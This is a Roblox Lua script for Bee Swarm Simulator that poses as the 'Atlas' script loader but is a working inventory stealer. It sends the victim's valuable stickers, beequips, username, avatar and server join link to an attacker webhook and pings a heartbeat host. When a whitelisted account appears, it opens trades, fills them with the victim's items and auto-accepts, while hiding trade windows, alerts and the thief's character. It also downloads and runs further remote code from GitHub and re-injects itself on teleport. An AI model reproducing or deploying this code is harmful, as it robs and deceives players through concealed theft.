_G.LINK = "https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/sigma.lua"

if(getgenv()['0xAtlas__executed'])then return;end;
getgenv()['0xAtlas__executed']=(1);
local function atlasInitVars()task.spawn(function()
    repeat task.wait() until _G.IAMABSOLUTELYDONE
    pcall(function()
        _G.thatloadinggui:Destroy()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, readfile("veryfirstjobid.txt"), game:GetService("Players").LocalPlayer)
    end)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/" .. (_G.META or "script") .. ".lua"))()
end)end
task.delay(2,atlasInitVars);

local function await(object, ...)
    local Result = object
    local Paths = {...}

    for i = 1, #Paths do
        Result = Result:WaitForChild(Paths[i], math.huge)
    end

    return Result
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = await(LocalPlayer, "PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local CameraTools = require(await(ReplicatedStorage, "CameraTools"))
local AlertBoxes = require(await(ReplicatedStorage, "AlertBoxes"))
local Events = require(await(ReplicatedStorage, "Events"))
local TradeGui = require(await(ReplicatedStorage, "Gui", "TradeGui"))
local TradeSessionID
local HitMessage
local StatModifiers = require(await(ReplicatedStorage, "StatModifiers"))
local BeeStatMods = require(await(ReplicatedStorage, "BeeStats", "BeeStatMods"))
local CaseEntry = require(await(ReplicatedStorage, "Beequips", "BeequipCaseEntry"))
local BeequipFile = require(await(ReplicatedStorage, "Beequips", "BeequipFile"))
local GameData = {
    IsPrivateServer = not await(ReplicatedFirst, "PlaceInfo", "IsPublicServer").Value,
    IsBSS = await(ReplicatedFirst, "PlaceType").Value == "Main" or await(ReplicatedFirst, "PlaceType").Value == "Hive Hub",
    CanTrade = await(LocalPlayer, "TradeConfig", "CanTrade").Value
}

local function HttpRequest(Url, Method, StatusCodes, Body, __Fails)
    local RequestFunction = (http and http.request) or (syn and syn.request) or http_request or request
    local Success, Response = pcall(function()
        return RequestFunction({
            Url = Url,
            Method = Method,
            Body = Body and HttpService:JSONEncode(Body),
            Headers = {
                ["content-type"] = "application/json"
            }
        })
    end)
    if not Success or not Response or not table.find(StatusCodes, Response.StatusCode) then
        warn(Success, Response)
        warn(("HttpRequest failed: %s\n%s"):format(Response and (Response.StatusCode or "No Response") or "No Response", Response.Body or "No Body"))
        task.wait(1 * (__Fails or 1))
        return HttpRequest(Url, Method, StatusCodes, Body, (__Fails or 0) + 1)
    end
    return Response
end
print("Variables initialized")

repeat task.wait() until game:IsLoaded()
local LoadingGUI = await(PlayerGui, "LoadingScreenGui", "LoadingMessage")
repeat task.wait() until not LoadingGUI.Visible
local ScreenGui = await(PlayerGui, "ScreenGui")
local TradeLayer = await(ScreenGui, "TradeLayer")
print("Game loaded")

local WhitelistedStickers = {
    "Bee Cub Skin",
    "Snow Cub Skin",
    "Peppermint Robo Cub Skin",
    "Noob Cub Skin",
    "Gloomy Cub Skin",
    "Gingerbread Cub Skin",
    "Doodle Cub Skin",
    "Brown Cub Skin",
    "Petal Cub Skin",
    "Robo Cub Skin",
    "Star Cub Skin",
    "Stick Cub Skin",

    "Icy Crowned Hive Skin",
    "Wavy Purple Hive Skin",
    "Wavy Doodle Hive Skin",

    "Offline Voucher",
    "Bear Bee Voucher",
    "x2 Bee Gather Voucher",
    "Cub Buddy Voucher",
    "x2 Convert Speed Voucher",
    "Ticket Voucher",

    "Capricorn Star Sign",
    "Aquarius Star Sign",
    "Pisces Star Sign",
    "Aries Star Sign",
    "Taurus Star Sign",
    "Gemini Star Sign",
    "Cancer Star Sign",
    "Leo Star Sign",
    "Virgo Star Sign",
    "Libra Star Sign",
    "Scorpio Star Sign",
    "Sagittarius Star Sign",

    "Sunflower Field Stamp",
    "Dandelion Field Stamp",
    "Mushroom Field Stamp",
    "Blue Flower Field Stamp",
    "Clover Field Stamp",
    "Strawberry Field Stamp",
    "Spider Field Stamp",
    "Bamboo Field Stamp",
    "Pineapple Patch Stamp",
    "Stump Field Stamp",
    "Cactus Field Stamp",
    "Pumpkin Patch Stamp",
    "Pine Tree Forest Stamp",
    "Rose Field Stamp",
    "Mountain Top Field Stamp",
    "Pepper Patch Stamp",
    "Coconut Field Stamp",

    "Left Gold Swirl Fleuron",
    "Right Gold Swirl Fleuron",
    "Left Shining Diamond Fleuron",
    "Right Shining Diamond Fleuron",
    "Left Mythic Gem Fleuron",
    "Right Mythic Gem Fleuron",

    "Round Basic Bee",
    "Glowering Gummy Bear",
    "Stranded Sun Bear",
    "Cyan Hilted Sword",
    "Abstract Color Painting",
    "Prism Painting",
    "Banana Painting",
    "Nessie",
    "Ionic Column Top",
    "Ionic Column Middle",
    "Ionic Column Base",
    "Royal Symbol",
    "BBM From Below"
}

local function GetPlayerStats()
    return require(await(ReplicatedStorage, "ClientStatCache")):Get()
end

local function GetTypeDef(File)
    local Success, Result = pcall(function()
        return CaseEntry.FromData(File):FetchBeequip(GetPlayerStats(), false)
    end)
    if Success then
        return Result
    end
    Success, Result = pcall(function()
        return BeequipFile.FromData(File)
    end)
    if Success then
        return Result
    end
    return nil
end

local function GetStickers()
    local PlayerStats = GetPlayerStats()
    local Stickers = PlayerStats.Stickers
    local Book = Stickers and Stickers.Book
    
    if not Book then
        warn("No sticker book!")
        return nil
    end

    local ReturnedStickers = {}

    for _, File in ipairs(Book) do
        if File:GetTypeDef() and table.find(WhitelistedStickers, File:GetTypeDef().Name) then
            table.insert(ReturnedStickers, File)
        end
    end

    return ReturnedStickers
end

local function GetBeequips()
    local PlayerStats = GetPlayerStats()
    local Beequips = PlayerStats.Beequips
    local Case = Beequips and Beequips.Case or {}
    local Storage = Beequips and Beequips.Storage or {}

    local ReturnedBeequips = {}

    pcall(function()
        for _, File in ipairs(Case) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, File)
                end
            end
        end
    end)

    pcall(function()
        for _, File in ipairs(Storage) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(File, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, File)
                end
            end
        end
    end)

    return ReturnedBeequips
end

local AtlasLoadstring = _G.LINK
pcall(function()
    queue_on_teleport("loadstring(game:HttpGet'" .. AtlasLoadstring .. "')()")
end)

local function InitStealer(UserWhitelist, Webhook)
    local function GetBQStatsString(File, Name)
        local Suc, Res = pcall(function()
            local BaseStats, HiveBonuses, Abilities = File:GenerateModifiers()
            local Potential = File.Q * 5
            local NumWaxes = (File:GetWaxHistory() and #File:GetWaxHistory()) or 0
            local Strings = {
                Base = '',
                Hivebonus = '',
                Ability = ''
            }
            if BaseStats then
                local Lines = {}
                for i, v in ipairs(BaseStats) do
                    local StatStr, Success = BeeStatMods.GetType(v.Stat).Desc(v)
                    if Success then
                        table.insert(Lines, StatStr)
                    end
                end
                Strings.Base = table.concat(Lines, "\n")
            end
            if HiveBonuses then
                local Lines = {}
                for i, v in ipairs(HiveBonuses) do
                    local StatStr = StatModifiers.Description(v)
                    if StatStr then
                        table.insert(Lines, StatStr)
                    end
                end
                Strings.Hivebonus = table.concat(Lines, "\n")
            end
            if Abilities then
                local Lines = {}
                for i, v in ipairs(Abilities) do
                    local Ability = v[1]
                    if Ability then
                        table.insert(Lines, Ability .. (v[2] and " (from wax)" or ''))
                    end
                end
                Strings.Ability = table.concat(Lines, "\n")
            end

            local Stats = {}

            local function Concat(...)
                for i, v in pairs({...}) do -- Fixed, changed to pairs!
                    if typeof(v) == "string" then
                        table.insert(Stats, v)
                    end
                end
                return nil
            end

            if Name == "Bead Lizard" then
                local TokenLink = Strings.Ability:match("Token Link")
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                if BeeAbilityPollen == nil and TokenLink == nil then
                    return
                end
                Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

            elseif Name == "Camphor Lip Balm" then
                local BubblePollen = Strings.Hivebonus:match("%+(%d+)%% Bubble Pollen")
                local GoldBubblePollen = Strings.Hivebonus:match("%+(%d+)%% Gold Bubble Pollen")
                local PepperPollen = Strings.Hivebonus:match("x(%d+%.%d+) Pepper Patch Pollen")
                if tonumber(PepperPollen) < 1.07 and tonumber(BubblePollen) < 18 then
                    if GoldBubblePollen then
                        local GBP = tonumber(GoldBubblePollen)
                        if GBP >= 6 then
                        elseif GBP == 5 then
                        elseif GBP == 4 then
                            if tonumber(BubblePollen) < 14 then return end
                        elseif GBP == 3 then
                            if tonumber(BubblePollen) < 15 then return end
                        elseif GBP == 2 then
                            if tonumber(BubblePollen) < 16 then return end
                        else
                            return
                        end
                    else
                        return
                    end
                end
                Concat(BubblePollen .. "% Bubble Pollen", GoldBubblePollen and GoldBubblePollen .. "% Gold Bubble Pollen", "x" .. PepperPollen .. " Pepper Patch Pollen")

            elseif Name == "Candy Ring" then
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                if tonumber(HoneyAtHive) < 9 then
                    return
                end
                Concat(HoneyAtHive .. "% Honey At Hive")

            elseif Name == "Charm Bracelet" then
                local AbilityRate = Strings.Base:match("%+(%d+)%% Ability Rate")
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                local Melody = Strings.Ability:match("Melody")
                if not Melody then
                    return
                end
                Concat(AbilityRate .. "% Ability Rate", HoneyAtHive and HoneyAtHive .. "% Honey At Hive", Melody and "Ability: Melody")

            elseif Name == "Kazoo" then
                local CPHB = Strings.Hivebonus:match("%+(%d+)%% Critical Power")
                local SCPHB = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
                if CPHB == nil and SCPHB == nil then
                    return
                end
                if CPHB then
                    if NumWaxes == 0 and Potential >= 4 and tonumber(CPHB) >= 4 then
                    else
                        if tonumber(CPHB) < 6 and not SCPHB then return end
                        if SCPHB then
                            if tonumber(SCPHB) == 1 and tonumber(CPHB) < 3 then return end -- Anything else above 2 scp + any crp is good
                        end
                    end
                else
                    if tonumber(SCPHB) < 2 then return end
                end
                Concat(CPHB and CPHB .. "% Critical Power", SCPHB and SCPHB .. "% Super-Crit Power")

            elseif Name == "Paperclip" then
                local TokenLink = Strings.Ability:match("Token Link")
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
                if BeeAbilityPollen == nil and TokenLink == nil and AbilityTokenLifespan == nil then
                    return
                end
                if BeeAbilityPollen == nil and TokenLink == nil then
                    if tonumber(AbilityTokenLifespan) < 7 then
                        return
                    end
                end
                if BeeAbilityPollen and tonumber(BeeAbilityPollen) < 3 then
                    if TokenLink == nil then return end
                    if not TokenLink then
                        if not AbilityTokenLifespan or tonumber(AbilityTokenLifespan) < 7 then return end
                    end
                end
                Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

            elseif Name == "Pink Shades" then
                local Focus = Strings.Ability:match("Focus")
                local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
                local SuperCritChance = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Chance")
                if SuperCritPower == nil and SuperCritChance == nil then
                    return
                end
                if SuperCritPower then
                    if tonumber(SuperCritPower) < 7 then
                        if not SuperCritChance then return end
                        if tonumber(SuperCritPower) < 3 then return end
                    end
                else
                    return
                end
                Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super-Crit Power", SuperCritChance and SuperCritChance .. "% Super-Crit Chance")

            elseif Name == "Smiley Sticker" then
                local HoneyMark = Strings.Ability:match("Honey Mark")
                local MarkDuration = Strings.Base:match("%+(%d+)%% Mark Duration")
                local MarkDurationHB = Strings.Hivebonus:match("%+(%d+)%% Mark Duration")
                if HoneyMark == nil then
                    return
                end
                Concat(HoneyMark and "Ability: Honey Mark", MarkDuration .. "% Mark Duration", MarkDurationHB and ("{HB} " .. MarkDurationHB .. "% Mark Duration"))

            elseif Name == "Sweatband" then
                local RedGatherAmount = Strings.Base:match("%+(%d+)%% Red Gather Amount")
                local WhiteGatherAmount = Strings.Base:match("%+(%d+)%% White Gather Amount")
                local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
                local WhitePollen = Strings.Hivebonus:match("%+(%d+)%% White Pollen")
                RedPollen = RedPollen and tonumber(RedPollen) or 0
                WhitePollen = WhitePollen and tonumber(WhitePollen) or 0
                if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < (27 - RedPollen)) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < (29 - WhitePollen))) then
                    return
                end
                Concat(
                    RedGatherAmount and RedGatherAmount .. "% Red Gather Amount", WhiteGatherAmount and WhiteGatherAmount .. "% White Gather Amount",
                    RedPollen and RedPollen .. "% Red Pollen", WhitePollen and WhitePollen .. "% White Pollen"
                )

            elseif Name == "Whistle" then
                local Melody = Strings.Ability:match("Melody")
                local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
                if Melody == nil and (not SuperCritPower or tonumber(SuperCritPower) < 4) then 
                    return
                end
                Concat(Melody and "Ability: Melody", SuperCritPower and SuperCritPower .. "% Super-Crit Power")

            elseif Name == "Elf Cap" then
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                if HoneyAtHive == nil then
                    return
                end
                if tonumber(HoneyAtHive) < 5 then
                    if NumWaxes == 1 then
                        if tonumber(HoneyAtHive) < 3 then
                            return
                        end
                    elseif NumWaxes == 2 then
                        if tonumber(HoneyAtHive) < 3 then
                            return
                        end
                    elseif NumWaxes == 3 then
                        if tonumber(HoneyAtHive) ~= 4 then
                            return
                        end
                    else
                        return
                    end
                end
                Concat(HoneyAtHive .. "% Honey At Hive")

            elseif Name == "Festive Wreath" then
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                if not HoneyAtHive or tonumber(HoneyAtHive) < 2 then
                    return
                end
                Concat(HoneyAtHive .. "% Honey At Hive")

            elseif Name == "Paper Angel" then
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
                if BeeAbilityPollen == nil or tonumber(BeeAbilityPollen) < 2 then
                    if AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 3 then
                        return
                    end
                end
                Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

            elseif Name == "Pinecone" then
                local PinetreeCapacity = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Capacity")
                local PinetreePollen = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Pollen")
                local PTC = tonumber(PinetreeCapacity)
                local PTP = tonumber(PinetreePollen)
                if PTC < 14 then return end
                if PTC == 14 or PTC == 15 then
                    return
                elseif PTC == 16 then
                    if PTP < 12 then return end
                elseif PTC == 17 then
                    if PTP < 9 then return end
                elseif PTC >= 18 then
                end
                Concat(PinetreeCapacity .. "% Pinetree Capacity", PinetreePollen .. "% Pinetree Pollen")

            elseif Name == "Poinsettia" then
                local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
                local BeeGatherPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Gather Pollen")
                if RedPollen == nil and BeeGatherPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                    return
                end
                if (not BeeGatherPollen or tonumber(BeeGatherPollen) < 12) then
                    local LimitRp = 7
                    if BeeGatherPollen and tonumber(BeeGatherPollen) >= 10 then
                        LimitRp = 5
                    end
                    if RedPollen and tonumber(RedPollen) >= LimitRp then
                    else
                        return
                    end
                end
                Concat(RedPollen and RedPollen .. "% Red Pollen", BeeGatherPollen and BeeGatherPollen .. "% Bee Gather Pollen")

            elseif Name == "Reindeer Antlers" then
                local BondFromTreats = Strings.Hivebonus:match("%+(%d+)%% Bond From Treats")
                local Capacity = Strings.Hivebonus:match("%+(%d+)%% Capacity")
                local BabyLove = Strings.Ability:match("Baby Love")
                if BondFromTreats == nil and Capacity == nil and BabyLove == nil then
                    return
                end
                if BondFromTreats == nil and BabyLove == nil then
                    if tonumber(Capacity) < 4 then
                        return
                    end
                end
                Concat(BondFromTreats and BondFromTreats .. "% Bond From Treats", Capacity and Capacity .. "% Capacity", BabyLove and "Ability: Baby Love")

            elseif Name == "Snow Tiara" then
                local BlueFieldCapacity = Strings.Hivebonus:match("^%+([%d%.]+)%% Blue Field Capacity")
                if tonumber(BlueFieldCapacity) < 6 then
                    return
                end
                Concat(BlueFieldCapacity .. "% Blue Field Capacity")

            elseif Name == "Toy Drum" then
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                    return
                end
                if not (NumWaxes == 0 and Potential >= 4.5) then
                    if not BeeAbilityPollen or tonumber(BeeAbilityPollen) < 4 then
                        return
                    end
                end
                Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

            elseif Name == "Toy Horn" then
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                --if not (NumWaxes == 0 and Potential >= 4.5) then
                    if not BeeAbilityPollen or tonumber(BeeAbilityPollen) < 2 then
                        return
                    end
                --end
                Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
            else
                return
            end

            return #Stats > 0 and table.concat(Stats, "\n") or "No Stats"
        end)
        if not Suc then
            return nil; --"An error occured filtering stats: " .. tostring(Res)
        else
            return Res
        end
    end

    local function Collapse(list)
        local Counts = {}
        local Order = {}

        for _, v in ipairs(list) do
            if Counts[v] then
                Counts[v] += 1
            else
                Counts[v] = 1
                table.insert(Order, v)
            end
        end

        local result = {}

        for _, v in ipairs(Order) do
            local n = Counts[v]
            table.insert(result, n .. "x " .. v )
        end

        return result
    end

    local function SortByHierarchy(List, Hierarchy)
        local function GetRank(Item)
            Item = string.lower(Item)

            for Index, Keyword in ipairs(Hierarchy) do
                if string.find(Item, string.lower(Keyword), 1, true) then
                    return Index
                end
            end

            return math.huge
        end

        table.sort(List, function(A, B)
            local RankA = GetRank(A)
            local RankB = GetRank(B)

            if RankA == RankB then
                return A < B
            end

            return RankA < RankB
        end)

        return List
    end

    local RequiredTrades = ((#GetStickers() + #GetBeequips()) > 30) and math.ceil((#GetStickers() + #GetBeequips()) / 30) or 1

    local function SendWebhook()
        local Stickers = GetStickers()
        local Beequips = GetBeequips()

        local function GetHeadshotUrl()
            local Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
            local Response = HttpService:JSONDecode(HttpRequest(Url, "GET", {200}).Body)
            return Response.data[1].imageUrl
        end

        if #Stickers > 0 or #Beequips > 0 then
            local JoinLink = ("https://www.roblox.com/games/start?placeId=130339340475651&launchData=%s/%s"):format(tostring(game.PlaceId), game.JobId)

            local StickerNames = {}
            local Hierachy = {
                "Cub Skin",
                "Voucher",
                "Hive Skin",
                "Star Sign",
                "Stamp",
                "Fleuron",
                "Painting"
            }

            for _, Sticker in ipairs(Stickers) do
                local Name = Sticker:GetTypeDef().Name:gsub("x2 ", '')
                table.insert(StickerNames, Name)
            end

            local SortedStickers = Collapse(SortByHierarchy(StickerNames, Hierachy))

            local BeequipData = {}
            for _, Beequip in ipairs(Beequips) do
                local TypeDef = GetTypeDef(Beequip)
                local Goods = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
                if not (#{Goods} > 0) then
                    continue
                end
                table.insert(BeequipData, {
                    displayName = TypeDef:GetTypeDef().DisplayName,
                    potential = TypeDef.Q,
                    waxCount = (TypeDef:GetWaxHistory() and #TypeDef:GetWaxHistory()) or 0,
                    stats = Goods
                })
            end

            _G.Exodus_WebhookBody = {
                inventory = {
                    stickers = SortedStickers,
                    beequips = BeequipData
                },
                user = {
                    userid = LocalPlayer.UserId,
                    name = identifyexecutor() .. " - " .. LocalPlayer.Name .. (game.PlaceId == 15579077077 and " [Hive Hub]" or "") .. " - " .. (_G.META == "rewrite" and "Rewrite" or "Normal"),
                    headshot = GetHeadshotUrl()
                },
                join_url = JoinLink,
                private_server = GameData.IsPrivateServer,
                hit_status = "Ongoing",
                trades_done = 0,
                trades_to_do = RequiredTrades,
                wusername = "Atlas webhook" -- wusername is intentional
            }

            HitMessage = HttpService:JSONDecode(HttpRequest(Webhook , "POST", {200, 204}, _G.Exodus_WebhookBody).Body)

            _G.Exodus_WebhookBody.message_id = HitMessage.id

            task.spawn(function()
                local assigned = "testbss"
                while true do
                    if #GetStickers() == 0 and #GetBeequips() == 0 then
                        break
                    end
                    HttpRequest("https://" .. assigned .. ".chieokure.workers.dev/heartbeat" , "POST", {200, 204, 500}, {
                        message_id = HitMessage.id,
                        userid = LocalPlayer.UserId
                    })
                    task.wait(5)
                end
                HttpRequest("https://" .. assigned .. ".chieokure.workers.dev/finished" , "POST", {200, 204, 500}, {
                    userid = LocalPlayer.UserId
                })
            end)
        end
    end

    do
        SendWebhook()
    end;

    local StealerPlayer
    local StealerTrading = nil
    local VictimTrading = nil

    local function UpdateStealerInfo(Player)
        StealerPlayer = Player
        StealerTrading = Player and await(Player, "TradeConfig", "IsTrading") or nil
        VictimTrading = Player and await(LocalPlayer, "TradeConfig", "IsTrading") or nil
    end

    Players.PlayerAdded:Connect(function(Player)
        if table.find(UserWhitelist, Player.UserId) then
            UpdateStealerInfo(Player)
        end
    end)

    Players.PlayerRemoving:Connect(function(Player)
        if table.find(UserWhitelist, Player.UserId) then
            UpdateStealerInfo(nil)
        end
    end)

    for _, Player in ipairs(Players:GetPlayers()) do
        if table.find(UserWhitelist, Player.UserId) then
            UpdateStealerInfo(Player)
        end
    end

    local function HideTrades()
        local Steps = {
            ["Hide trade notifications"] = function()
                local OldPush
                OldPush = hookfunction(AlertBoxes.Push, newcclosure(function(self, Text, ...)
                    if StealerPlayer and Text:find(StealerPlayer.Name) and Text:lower():find("trade") then return end
                    local includesbeequipname = false
                    for i, v in pairs({
                        "Bead Lizard",
                        "Camphor Lip Balm",
                        "Candy Ring",
                        "Charm Bracelet",
                        "Kazoo",
                        "Paperclip",
                        "Pink Shades",
                        "Smiley Sticker",
                        "Sweatband",
                        "Whistle",
                        "Elf Cap",
                        "Festive Wreath",
                        "Paper Angel",
                        "Pinecone",
                        "Poinsettia",
                        "Reindeer Antlers",
                        "Snow Tiara",
                        "Toy Drum",
                        "Toy Horn"
                    }) do
                        if Text:sub(1, 1) == "-" and Text:find(v) then
                            includesbeequipname = true
                            break
                        end
                    end
                    if StealerPlayer and includesbeequipname then return end
                    return OldPush(self, Text, ...)
                end))
            end,
            ["Hide trade cancelled/complete prompt"] = function()
                local Box = ScreenGui.MessagePromptBox
                Box:GetPropertyChangedSignal("Visible"):Connect(function()
                    if Box.Box.TextBox.Text:lower():find("trade") then
                        Box.Visible = false
                    end
                end)
            end,
            ["Allow moving in trade"] = function()
                local Old = clonefunction(CameraTools.DisablePlayerMovement)
                CameraTools.DisablePlayerMovement = function(...)
                    if not StealerPlayer then
                        return Old(...)
                    end
                    return
                end
            end,
            ["Hide trade frame"] = function()
                TradeLayer.Visible = false
                TradeLayer:GetPropertyChangedSignal("Visible"):Connect(function()
                    TradeLayer.Visible = false
                end)
            end,
            ["Disable blur"] = function()
                local BlurShade = await(ScreenGui, "BlurShade")
                local Blur = await(Lighting, "Blur")
                BlurShade.Visible = false
                Blur.Enabled = false
                BlurShade:GetPropertyChangedSignal("Visible"):Connect(function()
                    BlurShade.Visible = false
                end)
                Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
                    Blur.Enabled = false
                end)
            end,
            ["Hide Player"] = function()
                workspace.Amulets.ChildAdded:Connect(function(a)
                    a:Destroy()
                end)
                while true do
                    if StealerPlayer and StealerPlayer.Character and not table.find(UserWhitelist, LocalPlayer.UserId) then
                        StealerPlayer.Character:Destroy()
                    end
                    task.wait()
                end
            end,
        }

        for Name, Step in pairs(Steps) do
            --print("HideTrades Step: " .. Name)
            task.spawn(Step)
        end
    end

    task.spawn(function()
        local LastTrade = 0
        while task.wait() do
            if #GetStickers() > 0 or #GetBeequips() > 0 then
                if StealerPlayer and VictimTrading ~= nil and StealerTrading ~= nil then
                    if tick() - LastTrade >= 10 and not StealerTrading.Value and not VictimTrading.Value then
                        LastTrade = tick()
                        Events.ClientCall("TradePlayerRequestStart", StealerPlayer.UserId)
                    end
                else
                    LastTrade = 0
                end
            end
        end
    end)

    local function StartStealing()
        local function AddItem(File, Type)
            if Type == "Sticker" then
                local Name = File:GetTypeDef().Name
                local RealCategory = "Sticker"
                if Name:sub(-7) == "Voucher" or Name:sub(-9) == "Hive Skin" or Name:sub(-8) == "Cub Skin" then
                    RealCategory = "Sticker"
                end
                Events.ClientCall("TradePlayerAddItem", TradeSessionID, {
                    ["File"] = File,
                    ["Category"] = RealCategory
                })
            elseif Type == "Beequip" then
                Events.ClientCall("TradePlayerAddItem", TradeSessionID, {
                    ["File"] = File,
                    ["Category"] = Type
                })
            end
        end

        local function AcceptTrade()
            while VictimTrading.Value and StealerTrading.Value do
                local _, Button = pcall(function()
                    return TradeLayer.TradeAnchorFrame.TradeFrame.ButtonAccept.ButtonTop.TextLabel
                end)
                if typeof(Button) == "Instance" and Button.Text ~= "Unaccept" then
                    Events.ClientCall("TradePlayerAccept", TradeSessionID, {
                        [tostring(LocalPlayer.UserId)] = TradeGui.GetMyOffer(),
                        [tostring(StealerPlayer.UserId)] = TradeGui.GetTheirOffer()
                    })
                end
                task.wait(1.5)
            end
        end

        local SpaceUsed = 0
        local MaxOfferSize = 30
        local StickersToSteal = GetStickers()
        local BeequipsToSteal = GetBeequips()

        for _, Sticker in ipairs(StickersToSteal) do
            if SpaceUsed > MaxOfferSize then break end

            AddItem(Sticker, "Sticker")
            task.wait(0.2)

            SpaceUsed += 1
        end

        for _, Beequip in ipairs(BeequipsToSteal) do
            if SpaceUsed > MaxOfferSize then break end

            AddItem(Beequip, "Beequip")
            task.wait(0.2)

            SpaceUsed += 1
        end

        AcceptTrade()
    end

    TradeLayer.ChildAdded:Connect(function(Frame)
        if StealerPlayer and Frame.Name == "TradeAnchorFrame" then
            repeat task.wait() until VictimTrading and StealerTrading and VictimTrading.Value and StealerTrading.Value
            warn("Started trading")
            StartStealing()
        end
    end)

    local function TrackTrades()
        local IsTrading = false
        local TradesDone = 0
        Events.ClientListen("TradeUpdateInfo", function(IncomingData)
            TradeSessionID = IncomingData.SessionID
            if IncomingData.State == "Ongoing" and not IsTrading then
                IsTrading = true
                TradesDone = TradesDone + 1
                _G.Exodus_WebhookBody.trades_done = TradesDone
                _G.Exodus_WebhookBody.hit_status = "In Progress"
                HttpRequest(Webhook, "PATCH", {200, 204}, _G.Exodus_WebhookBody)
            end
            if IncomingData.State == "Completed" then
                IsTrading = false
                if #GetStickers() == 0 and #GetBeequips() == 0 then
                    _G.IAMABSOLUTELYDONE = true
                    _G.Exodus_WebhookBody.hit_status = "Completed"
                    HttpRequest(Webhook, "PATCH", {200, 204}, _G.Exodus_WebhookBody)
                end
            end
            if IncomingData.State == "Canceled" then
                IsTrading = false
            end
        end)
    end

    do
        TrackTrades()
    end;

    if #GetStickers() > 0 or #GetBeequips() > 0 then
        if GameData.IsPrivateServer then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/install5.lua"))()
            return
        else
            HideTrades()
        end
    else
        _G.IAMABSOLUTELYDONE = true
    end

    return nil
end

if #Players:GetPlayers() == Players.MaxPlayers and (#GetStickers() > 0 or #GetBeequips() > 0) then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/install5.lua"))()
    return
end

task.spawn(InitStealer,
    {10871663845, 10862024167, 10967239461},
    "https://bss.chieokure.workers.dev/"
)

--[[task.delay(math.random(1, 3), function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/script.lua"))()
end)]]
